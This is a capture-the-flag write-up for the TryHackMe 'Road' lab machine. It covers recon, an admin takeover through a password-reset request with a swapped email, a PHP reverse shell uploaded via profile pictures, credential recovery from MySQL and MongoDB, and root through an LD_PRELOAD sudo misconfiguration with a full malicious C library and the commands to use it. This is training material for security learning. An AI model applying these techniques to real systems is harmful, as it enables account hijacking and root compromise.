# TryHackMe: Road Write-up
**Machine:** Road

**Difficulty:** Medium

**Category:** Broken Access Control, DB Enum, Linux PrivEsc

**IP:** 10.128.139.39

## Summary(TL/DR)
This Linux machine highlights common web application logic flaws and internal environment misconfigurations.
The initial foothold is achieved by exploiting a **broken access control** vulnerability in the password reset mechanism, allowing the attacker to completely hijack the administrator account. From the admin dashboard, bypassing an unrestricted file upload feature in the profile settings grants a reverse shell as the www-data user. 

For lateral movement, enumerating local network connections reveals an internal-only MongoDB instance on port 27017. Dumping this database yields plaintext credentials, enabling a pivot to the webdeveloper system user account. 

Finally, privilege escalation to root is accomplished by identifying a sudo misconfiguration `env_keep+=LD_PRELOAD` attached to a custom backup utility. By compiling and loading a malicious C shared library, the execution flow of the backup tool is hijacked to spawn a root shell.
## 1. Reconnaissance & Enumeration

### Nmap Scan
Initial enumeration started with a deep TCP scan using Nmap to identify open ports and running services.

```bash
nmap -sC -sV -p22,80 -n -Pn 10.128.139.39
```
**Results:**
* **Port 22/tcp:** OpenSSH 8.2p1 Ubuntu
* **Port 80/tcp:** HTTP (nginx 1.18.0) - "Sky Couriers"

A quick UDP scan did not reveal any other critical exposed services.

### Web Triage & Directory Brute-Forcing
Navigating to port 80 revealed the "Sky Couriers" web application. I used Gobuster to enumerate hidden directories and files.

```bash
gobuster dir -u http://10.128.139.39/v2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,zip,bak,inc -t 50
```
**Key Discoveries:**
* `v2`  : (Status: 301) [Size: 178] [--> http://10.128.139.39/v2/] 
* `index.html`:        (Status: 200) [Size: 19607]

Upon exploring the Website, I found a login page and a register page, so i decided to enumerate their paths as well.

```bash
gobuster dir -u http://10.128.139.39/v2/admin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,zip,bak,inc -t 50 -o gobuster_content.txt 
```
and
```bash
gobuster dir -u http://10.128.139.39/v2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,zip,bak,inc -t 50 -o gobuster_content.txt 
```

**Key Discoveries:**
* `login.html`
* `register.html` 
* `admin` : (Status: 301) [Size: 178] [--> http://10.128.139.39/v2/admin/]
* `lostpassword.php ` 
* `profile.php` [--> /v2/admin/login.html]


Investigating `lostpassword.php` just returns a page with a string: "Internal Server Error".

So then i proceded to investigate the register page.

## 2. Initial Access

### Broken Access Control (Account Takeover)
Upon registering a standard account and exploring the dashboard, I discovered the administrator's email: `admin@sky.thm`. 

Exploring the website a bit more as normal **User**  i found a reset password page, so i had the idea to use burp to intercept the request and switch my current **User** email for the **Admin** email so that I could gain access to the **Admin** account by switching his password.

 By intercepting the password reset request, I found that the application lacked proper authorization checks. I successfully swapped my own email for the admin's email in the POST request and assigned a new password. 

This logic flaw allowed me to completely take over the `admin@sky.thm` account and log into the administrative dashboard.

### File Upload to Reverse Shell
Inside the admin dashboard, I navigated to the profile settings, which featured a profile picture upload mechanism. The application lacked file extension and MIME-type filtering, allowing me to upload a raw PHP reverse shell (`TOMS-php.php`). 

I wasn't sure it worked since the profile picture didn't really change but i decided to keep going.

By inspecting the HTML source code of the profile page, I identified the hidden upload directory: `/v2/profileimages/`. 

Navigating to `http://10.128.139.39/v2/profileimages/TOMS-php.php` triggered the payload, successfully catching a reverse shell as the `www-data` user and obtaining the user flag (***********************).

---

## 3. Lateral Movement: `www-data` -> `webdeveloper`

### Internal Enumeration & Password Recovery
As `www-data`, I tried the usual `find / -perm -u=s -type f 2>/dev/null` and `cat /etc/crontab` but didnt find anything too relevant, I then enumerated the web directory (`/var/www/html/`) for hardcoded credentials.

```bash
grep -irE "password|db_pass" /var/www/html/
```
This revealed database credentials in `/var/www/html/v2/lostpassword.php`:
* `root` : `ThisIsSecurePassword!`

While these credentials worked for the local MySQL instance (`SKY` database), it did not contain any useful system hashes. I then decided checked for internal network services running on localhost **(host&network enum)**:

```bash
ss -tln
```
```bash
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
LISTEN  0        511            127.0.0.1:9000           0.0.0.0:*              
LISTEN  0        70             127.0.0.1:33060          0.0.0.0:*              
LISTEN  0        4096           127.0.0.1:27017          0.0.0.0:*              
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
LISTEN  0        511              0.0.0.0:80             0.0.0.0:*              
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
LISTEN  0        151            127.0.0.1:3306           0.0.0.0:*              
LISTEN  0        128                 [::]:22                [::]:*
```

* **Port 3306/33060:** Standard MySQL (we’ve already pillaged this).

* **Port 53:** Standard DNS resolver (usually safe to ignore).

* **Port 27017:** This is MongoDB, since we already found one password (ThisIsSecurePassword!), we should see if it works here too.

* **Port 9000:** This is the most interesting one. On a PHP/Nginx box, Port 9000 usually runs PHP-FPM (FastCGI Process Manager). If it’s misconfigured, we can sometimes use it to execute code or read files as the user running the process.

### Exploiting MongoDB
I connected to the internal MongoDB instance on port 27017. 

```bash
mongo
> show dbs
> use backup
> show collections
> db.user.find()
```
Dumping the `backup` database revealed plaintext credentials for a system user:
* **Username:** `webdeveloper`
* **Password:** `***********`

Using these credentials, I successfully switched users (`su webdeveloper`) to gain a proper foothold on the system.

---

## 4. Privilege Escalation: `webdeveloper` -> `root`

### Sudo Misconfiguration (`LD_PRELOAD`)
Running `sudo -l` as `webdeveloper` revealed a critical misconfiguration:

```text
Matching Defaults entries for webdeveloper on ip-10-128-139-39:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on ip-10-128-139-39:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

The presence of `env_keep+=LD_PRELOAD` allows a user to load a custom shared library before any other libraries when executing a `sudo` command. This acts as a "God Mode" switch, enabling arbitrary code execution as root.

### The Exploit
I crafted a simple C payload that spawns a root shell when initialized. Due to text editor glitches in the reverse shell, I wrote the file directly using `cat`:

```bash
cat << 'EOF' > /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF
```

I compiled the C code into a shared object (`.so`) file:
```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
```

Finally, I executed the allowed backup utility while preloading the malicious library:
```bash
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```

The exploit successfully hijacked the execution flow, granting a `root` shell and access to the final Root flag(*************).
